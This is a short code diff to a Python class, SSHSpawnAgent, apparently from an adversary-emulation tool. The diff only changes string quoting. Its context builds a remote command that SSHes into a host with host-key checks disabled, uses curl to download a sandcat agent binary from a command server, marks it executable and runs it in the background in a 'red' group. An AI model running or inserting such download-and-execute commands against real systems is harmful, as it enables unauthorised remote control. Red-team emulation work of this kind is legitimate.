@@ -12,8 +12,8 @@ class SSHSpawnAgent(LowLevelAction):
         remote_cmd = (
             f'agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" {server}/file/download '
             f'2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d= -f2 | tr -d "\\"\\r") '
-            f'&& chmod +x $agent 2>/dev/null; '
-            f'nohup ./$agent -server {server} -group red >/dev/null 2>&1 &'
+            f"&& chmod +x $agent 2>/dev/null; "
+            f"nohup ./$agent -server {server} -group red >/dev/null 2>&1 &"
         )
         command = (
             f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
